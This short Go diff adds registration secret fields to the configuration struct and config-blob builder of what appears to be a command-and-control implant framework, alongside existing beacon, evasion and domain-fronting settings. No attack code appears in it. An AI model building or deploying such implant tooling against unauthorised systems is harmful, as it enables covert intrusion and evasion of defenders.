@@ -35,6 +35,8 @@ type agentConfigJSON struct {
 	Proxy            string `json:"proxy"`
 	CryptoKey        string `json:"crypto_key"`
 	BeaconKey        string `json:"beacon_key"`
+	RegSecretID      string `json:"reg_secret_id"`
+	RegSecret        string `json:"reg_secret"`
 	ExpiryDate       string `json:"expiry"`
 	Evasion          string `json:"evasion"`
 	DomainFront      string `json:"domain_front"`
@@ -121,6 +123,8 @@ func buildConfigBlob(cfg ImplantConfig, profile MalleableProfile) string {
 		Proxy:            cfg.Proxy,
 		CryptoKey:        cfg.CryptoKey,
 		BeaconKey:        cfg.BeaconKey,
+		RegSecretID:      cfg.RegSecretID,
+		RegSecret:        cfg.RegSecret,
 		ExpiryDate:       cfg.ExpiryDate,
 		Evasion:          evasionStr,
 		DomainFront:      cfg.DomainFront,
